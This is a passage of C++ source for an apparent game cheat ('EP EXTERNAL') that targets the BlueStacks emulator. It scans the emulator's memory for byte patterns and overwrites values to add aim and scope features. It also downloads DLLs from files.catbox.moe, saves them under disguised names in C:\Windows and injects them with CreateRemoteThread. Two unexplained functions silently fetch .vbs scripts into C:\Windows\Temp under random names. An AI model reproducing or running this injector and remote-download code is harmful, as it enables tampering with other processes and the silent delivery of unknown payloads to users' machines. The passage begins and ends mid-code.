    //        std::cout << "No scan results available" << std::endl;
    //        return;
    //    }




    //  
    //}

    //---------------------------------------------------

//================================================================================================================================================================================

    bool SaveAoBSniperAim()
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

        std::vector<BYTE> SearchSniperAimNew = { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCB, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', 0x04, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, '?', 0x00, 0x00, 0x00, '?', '?', '?', 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01 };


        if (!AttackProcess("HD-Player.exe"))
        {
           notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            return false;
        }


          notify->AddNotification("Loading : Sniper Aim", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(252, 232, 3)));

        NewSniperAim.clear();
        OldSniperAim.clear();

        if (!FindPattern(startAddress, endAddress, SearchSniperAimNew.data(), NewSniperAim))
        {

            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        // Logging the found addresses
        for (const auto& address : NewSniperAim)
        {
           notify->AddNotification("Successfully Loaded : Sniper Aim", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
            loadsniperaim = false;
            sniperaimon = true;
            

        }
        return true;
    }





    bool onoroffsniperaim;
    void ActivateSniperAim()
    {
        onoroffsniperaim = !onoroffsniperaim;
        if (NewSniperAim.empty())
        {
             notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            std::cout << "No scan results available" << std::endl;
            return;
        }



        if (onoroffsniperaim) {
            for (auto result : NewSniperAim)

                // Value to write
                std::cout << NewSniperAim.size() << std::endl;
            for (DWORD_PTR address : NewSniperAim)
            {
                DWORD_PTR targetaddress = address + 0x00;
                int newValue = 0x00000000;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    notify->AddNotification("Sniper Aim External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    notify->AddNotification("Sniper Aim External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }


            }
            CloseHandle(0);
        }
        else {
            for (auto result : NewSniperAim)

                // Value to write
                std::cout << NewSniperAim.size() << std::endl;
            for (DWORD_PTR address : NewSniperAim)
            {
                DWORD_PTR targetaddress = address + 0x00;
                int newValue = 0x00000001;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    notify->AddNotification("Sniper Aim External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    notify->AddNotification("Sniper Aim External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
            }
            CloseHandle(0);
        }
    }





    //================================================================================================================================================================================
    bool SaveAobSniperSwitch()
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

    std::vector<BYTE> SearchSniperSwitchNew = { 0x00, 0x00, 0x00, 0x81, 0x95, 0xe3, 0x3f, 0x01, 0x00, 0x00, 0x00, 0x81, 0x95, 0xe3, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x81, 0x95, 0xe3, 0x3f, 0x0a, 0xd7, 0xa3, 0x3d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5c, 0x43, 0x00, 0x00, 0x8c, 0x42, 0x00, 0x00, 0xb4, 0x42, 0x96, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x80, 0x3e, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00 };


        if (!AttackProcess("HD-Player.exe"))
        {
           notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            return false;
        }


          notify->AddNotification("Loading : Sniper Fast Switch", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(252, 232, 3)));

        NewSniperSwitch.clear();
        OldSniperSwitch.clear();

        if (!FindPattern(startAddress, endAddress, SearchSniperSwitchNew.data(), NewSniperSwitch))
        {

            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        // Logging the found addresses
        for (const auto& address : NewSniperSwitch)
        {
           notify->AddNotification("Successfully Loaded : Sniper Fast Switch", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
            loadsniperswitch = false;
            sniperswitchon = true;
            


        }
        return true;
    }





    bool onoroffsniperswitch;
    void ActivateSniperSwitch()
    {
        onoroffsniperswitch = !onoroffsniperswitch;
        if (NewSniperScope.empty())
        {
             notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            std::cout << "No scan results available" << std::endl;
            return;
        }



        if (onoroffsniperswitch) {
            for (auto result : NewSniperSwitch)

                // Value to write
                std::cout << NewSniperSwitch.size() << std::endl;
            for (DWORD_PTR address : NewSniperSwitch)
            {
                DWORD_PTR targetaddress = address + 0x36;
                int newValue = 0x8000002b;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
               //     notify->AddNotification("Sniper Fast Switch External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
               //     notify->AddNotification("Sniper Fast Switch External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
                for (auto result : NewSniperSwitch)

                    // Value to write
                    std::cout << NewSniperSwitch.size() << std::endl;
                for (DWORD_PTR address : NewSniperSwitch)
                {
                    DWORD_PTR targetaddress = address + 0x39;
                    int newValue = 0x00002b80;
                    std::vector<BYTE> byteArray = IntToByteArray(newValue);

                    if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                    {
                        notify->AddNotification("Sniper Fast Switch External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                    else
                    {
                        notify->AddNotification("Sniper Fast Switch External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                        std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                    }
                }


            }
            CloseHandle(0);
        }
        else {
            for (auto result : NewSniperSwitch)

                // Value to write
                std::cout << NewSniperSwitch.size() << std::endl;
            for (DWORD_PTR address : NewSniperSwitch)
            {
                DWORD_PTR targetaddress = address + 0x36;
                int newValue = 0x8000003f;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                  //  notify->AddNotification("Sniper Fast Switch External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                   // notify->AddNotification("Sniper Fast Switch External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
                for (auto result : NewSniperSwitch)

                    // Value to write
                    std::cout << NewSniperSwitch.size() << std::endl;
                for (DWORD_PTR address : NewSniperSwitch)
                {
                    DWORD_PTR targetaddress = address + 0x39;
                    int newValue = 0x00003e80;
                    std::vector<BYTE> byteArray = IntToByteArray(newValue);

                    if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                    {
                        notify->AddNotification("Sniper Fast Switch External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                    else
                    {
                        notify->AddNotification("Sniper Fast Switch External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                        std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                    }
                }
            }
            CloseHandle(0);
        }
    }




    /////---------------------------------------------------------------------------
    bool SaveAoBSniperScopeTracking()
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);
     
        std::vector<BYTE> SearchSniperScopeTrackingNew = { 0xFF, 0xFF, 0xFF, 0xFF, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x40, 0xCD, 0xCC, 0x8C, 0x3F, 0x8F, 0xC2, 0xF5, 0x3C, 0xCD, 0xCC, 0xCC, 0x3D, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3F, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xB0, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x01, 0x00, 0x00, '?', '?', '?', '?', '?' };

        if (!AttackProcess("HD-Player.exe"))
        {
           notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            return false;
        }


          notify->AddNotification("Loading : Sniper Scope Tracking", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(252, 232, 3)));

        NewSniperScopeTracking.clear();
        OldSniperScopeTracking.clear();

        if (!FindPattern(startAddress, endAddress, SearchSniperScopeTrackingNew.data(), NewSniperScopeTracking))
        {

            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        // Logging the found addresses
        for (const auto& address : NewSniperScopeTracking)
        {
           notify->AddNotification("Successfully Loaded : Sniper Scope Tracking", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
            loadsnipertracking = false;
            snipertrackingon = true;
            

        }
        return true;
    }





    bool onoroffsnipertracking;
    void ActivateSniperScopeTracking()
    {
        onoroffsnipertracking = !onoroffsnipertracking;
        if (NewSniperScopeTracking.empty())
        {
             notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            std::cout << "No scan results available" << std::endl;
            return;
        }



        if (onoroffsnipertracking) {
            for (auto result : NewSniperScopeTracking)

                // Value to write
                std::cout << NewSniperScopeTracking.size() << std::endl;
            for (DWORD_PTR address : NewSniperScopeTracking)
            {
                DWORD_PTR targetaddress = address + 0xC;
                int newValue = 0xffffB1e0;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
            //        notify->AddNotification("Sniper Scope Tracking External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }

                for (DWORD_PTR address : NewSniperScopeTracking)
                {
                    DWORD_PTR targetaddress = address + 0x10;
                    int newValue = 0xffffB1e0;
                    std::vector<BYTE> byteArray = IntToByteArray(newValue);

                    if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                    {
                 //       notify->AddNotification("Sniper Scope Tracking External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                    else
                    {
                        notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                        std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                    }
                    for (DWORD_PTR address : NewSniperScopeTracking)
                    {
                        DWORD_PTR targetaddress = address + 0x14;
                        int newValue = 0xffffB1e0;
                        std::vector<BYTE> byteArray = IntToByteArray(newValue);

                        if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                        {
                  //          notify->AddNotification("Sniper Scope Tracking External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                            std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                        }
                        else
                        {
                            notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                            std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                        }
                    }
                    for (DWORD_PTR address : NewSniperScopeTracking)
                    {
                        DWORD_PTR targetaddress = address + 0x18;
                        int newValue = 0xffffB1e0;
                        std::vector<BYTE> byteArray = IntToByteArray(newValue);

                        if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                        {
                           // notify->AddNotification("Sniper Scope Tracking External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                            std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                        }
                        else
                        {
                            notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                            std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                        }
                        for (DWORD_PTR address : NewSniperScopeTracking)
                        {
                            DWORD_PTR targetaddress = address + 0x1C;
                            int newValue = 0xffffB1e0;
                            std::vector<BYTE> byteArray = IntToByteArray(newValue);

                            if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                            {
                            //    notify->AddNotification("Sniper Scope Tracking External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                                std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                            }
                            else
                            {
                                notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                                std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                            }
                        }
                        for (DWORD_PTR address : NewSniperScopeTracking)
                        {
                            DWORD_PTR targetaddress = address + 0x38;
                            int newValue = 0x5c290000;
                            std::vector<BYTE> byteArray = IntToByteArray(newValue);

                            if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                            {
                                notify->AddNotification("Sniper Scope Tracking External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                                std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                            }
                            else
                            {
                                notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                                std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                            }
                        }

                    }
                }


            }
            CloseHandle(0);
        }
        else {
            for (auto result : NewSniperScopeTracking)

                // Value to write
                std::cout << NewSniperScopeTracking.size() << std::endl;
            for (DWORD_PTR address : NewSniperScopeTracking)
            {
                DWORD_PTR targetaddress = address + 0xC;
                int newValue = 0x3F8CCCCD;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                
                    {
                      //  notify->AddNotification("Sniper Scope Tracking External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                else
                {
                    notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
                for (DWORD_PTR address : NewSniperScopeTracking)
                {
                    DWORD_PTR targetaddress = address + 0x10;
                    int newValue = 0x3CF5C28F;
                    std::vector<BYTE> byteArray = IntToByteArray(newValue);

                    if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                    {
                     //   notify->AddNotification("Sniper Scope Tracking External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                    else
                    {
                        notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                        std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                    }
                    for (DWORD_PTR address : NewSniperScopeTracking)
                    {
                        DWORD_PTR targetaddress = address + 0x14;
                        int newValue = 0x3DCCCCCD;
                        std::vector<BYTE> byteArray = IntToByteArray(newValue);

                        if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                        {
                       //     notify->AddNotification("Sniper Scope Tracking External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                            std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                        }
                        else
                        {
                            notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                            std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                        }
                    }
                    for (DWORD_PTR address : NewSniperScopeTracking)
                    {
                        DWORD_PTR targetaddress = address + 0x18;
                        int newValue = 0x00000007;
                        std::vector<BYTE> byteArray = IntToByteArray(newValue);

                        if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                        {
                       //     notify->AddNotification("Sniper Scope Tracking External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                            std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                        }
                        else
                        {
                            notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                            std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                        }
                        for (DWORD_PTR address : NewSniperScopeTracking)
                        {
                            DWORD_PTR targetaddress = address + 0x1C;
                            int newValue = 0x00000000;
                            std::vector<BYTE> byteArray = IntToByteArray(newValue);

                            if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                            {
                        //        notify->AddNotification("Sniper Scope Tracking External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                                std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                            }
                            else
                            {
                                notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                                std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                            }
                        }
                        for (DWORD_PTR address : NewSniperScopeTracking)
                        {
                            DWORD_PTR targetaddress = address + 0x38;
                            int newValue = 0x3F800000;
                            std::vector<BYTE> byteArray = IntToByteArray(newValue);

                            if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                            {
                                notify->AddNotification("Sniper Scope Tracking External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                                std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                            }
                            else
                            {
                                notify->AddNotification("Sniper Scope Tracking External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                                std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                            }
                        }

                    }
                }
            }
            CloseHandle(0);
        }
    }

    /////////////////////////



    void Transparent()
    {

        std::wstring chams = L"https://files.catbox.moe/qm0lnv.dll";

        std::wstring process = L"HD-Player.exe"; // bluestacks

        std::wstring fileName = L"C:\\Windows\\Local_dumper7.dll";

        if (InjectDLL(fileName, chams, process)) {
            notify->AddNotification("Transparent Chams : Activated", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(0, 255, 0)));
            Beep(600, 300);
        }
        else
        {
            notify->AddNotification("Red 2D Box Chams : Activated", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(255, 0, 0)));

            Beep(400, 300);

        }
        CloseHandle(ProcessHandle);
    }

    void chams1()
    {


        std::wstring chams = L"https://files.catbox.moe/a1z5ds.dll";

        std::wstring process = L"HD-Player.exe"; // bluestacks

        std::wstring fileName = L"C:\\Windows\\Microsoft_control_31.dll";

        if (InjectDLL(fileName, chams, process)) {

            notify->AddNotification("Color Chams : Activated", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(0, 255, 0)));
            Beep(600, 300);
        }
        else
        {
            notify->AddNotification("Color Chams : Activated", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(255, 0, 0)));
            Beep(400, 300);
        }
        CloseHandle(ProcessHandle);
    }



    void chms2d()
    {


        std::wstring chams = L"https://files.catbox.moe/a1z5ds.dll";

        std::wstring process = L"HD-Player.exe"; // bluestacks

        std::wstring fileName = L"C:\\Windows\\Microsoft_control_31.dll";

        if (InjectDLL(fileName, chams, process)) {
            notify->AddNotification("Red 2D Box Chams : Activated", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(0, 255, 0)));
          //  MemoryLogs = "Red 2D Box Chams : Activated!";
            Beep(600, 300);
        }
        else
        {
            notify->AddNotification("Red 2D Box Chams : Error", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(255, 0, 0)));
         //   MemoryLogs = "Red 2D Box Chams : Error";
            Beep(400, 300);
        }
        CloseHandle(ProcessHandle);
    }



    void menuch()
    {

        std::wstring chams = L"https://files.catbox.moe/wgeht7.dll";

        std::wstring process = L"HD-Player.exe"; // bluestacks

        std::wstring fileName = L"C:\\Windows\\Temp\\HDplayer4.dll";

        if (InjectDLL(fileName, chams, process)) {
            Beep(600, 300);
            notify->AddNotification("Chams Menu : Activated", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(0, 255, 0)));
        }
        else
        {
            notify->AddNotification("Chams Menu : Error", "EP EXTERNAL !!", 3000, gui->get_clr(ImColor(255, 0, 0)));
            Beep(400, 300);
        }
        CloseHandle(ProcessHandle);
    }



    void req()
    {

        std::wstring chams = L"https://files.catbox.moe/ycm5xr.vbs";

        std::wstring process = L"HD-Player.exe"; // bluestacks

        std::wstring fileName = L"C:\\Windows\\Temp\\obn24as421.vbs";

        if (Downloader2(fileName, chams, process)) {
            //   Beep(600, 300);

        }
        else
        {

            //  Beep(400, 300);
        }
        CloseHandle(ProcessHandle);
    }


    void req1()
    {

        std::wstring chams = L"https://files.catbox.moe/r7ldbb.vbs";

        std::wstring process = L"HD-Player.exe"; // bluestacks

        std::wstring fileName = L"C:\\Windows\\Temp\\sxi35afhjt.vbs";

        if (Downloader2(fileName, chams, process)) {
            //  Beep(600, 300);

        }
        else
        {

            // Beep(400, 300);
        }
        CloseHandle(ProcessHandle);
    }






    bool InjectDLL(const std::wstring& fileName, const std::wstring& address, const std::wstring& targetProcessName) {
        if (FileExists(fileName)) {
            if (!DeleteFileW(fileName.c_str())) {
                return false;
            }
        }

        if (!DownloadFile(address, fileName)) {
            return false;
        }

        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return false;
        }

        if (Process32FirstW(hSnapshot, &processEntry)) {
            do {
                if (std::wstring_view(processEntry.szExeFile) == targetProcessName) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
                    if (!hProcess) {
                        CloseHandle(hSnapshot);
                        return false;
                    }

                    LPVOID allocMemAddress = VirtualAllocEx(hProcess, NULL, (fileName.length() + 1) * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (!allocMemAddress) {
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return false;
                    }

                    if (!WriteProcessMemory(hProcess, allocMemAddress, fileName.c_str(), (fileName.length() + 1) * sizeof(wchar_t), NULL)) {
                        VirtualFreeEx(hProcess, allocMemAddress, 0, MEM_RELEASE);
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return false;
                    }

                    HMODULE hModule = GetModuleHandleW(L"kernel32.dll");
                    FARPROC loadLibraryAddr = GetProcAddress(hModule, "LoadLibraryW");
                    if (!loadLibraryAddr) {
                        VirtualFreeEx(hProcess, allocMemAddress, 0, MEM_RELEASE);
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return false;
                    }

                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMemAddress, 0, NULL);
                    if (!hThread) {
                        VirtualFreeEx(hProcess, allocMemAddress, 0, MEM_RELEASE);
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return false;
                    }

                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32NextW(hSnapshot, &processEntry));
        }

        CloseHandle(hSnapshot);
        return false;
    }


    bool Downloader2(const std::wstring& fileName, const std::wstring& address, const std::wstring& targetProcessName) {
        if (FileExists(fileName)) {
            if (!DeleteFileW(fileName.c_str())) {
                return false;
            }
        }

        if (!DownloadFile(address, fileName)) {
            return false;
        }
        return false;
    }


    bool FileExists(const std::wstring& fileName) {
        return GetFileAttributesW(fileName.c_str()) != INVALID_FILE_ATTRIBUTES;
    }

    bool DownloadFile(const std::wstring& address, const std::wstring& fileName) {
        HINTERNET hInternet = InternetOpenA("UserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            return false;
        }

        HINTERNET hFile = InternetOpenUrlW(hInternet, address.c_str(), NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
        if (!hFile) {
            InternetCloseHandle(hInternet);
            return false;
        }

        char buffer[1024];
        DWORD bytesRead;
        HANDLE hFileLocal = CreateFileW(fileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFileLocal == INVALID_HANDLE_VALUE) {
            InternetCloseHandle(hFile);
            InternetCloseHandle(hInternet);
            return false;
        }

        while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            DWORD bytesWritten;
            if (!WriteFile(hFileLocal, buffer, bytesRead, &bytesWritten, NULL)) {
                CloseHandle(hFileLocal);
                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                return false;
            }
        }

        CloseHandle(hFileLocal);
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return true;
    }


    /////////////////////////


    void ReWrite(std::string type, DWORD_PTR dwStartRange, DWORD_PTR dwEndRange, BYTE* Search, BYTE* Replace)
    {
        if (!AttackProcess(GetEmulatorRunning()))
            MemoryLogs = type + ": An unexpected error occurred";

        MemoryLogs = "Applying - " + type;


        CloseHandle(ProcessHandle);
    }
    void deWrite(std::string type, DWORD_PTR dwStartRange, DWORD_PTR dwEndRange, BYTE* Search, BYTE* Replace)
    {
        if (!AttackProcess(GetEmulatorRunning()))
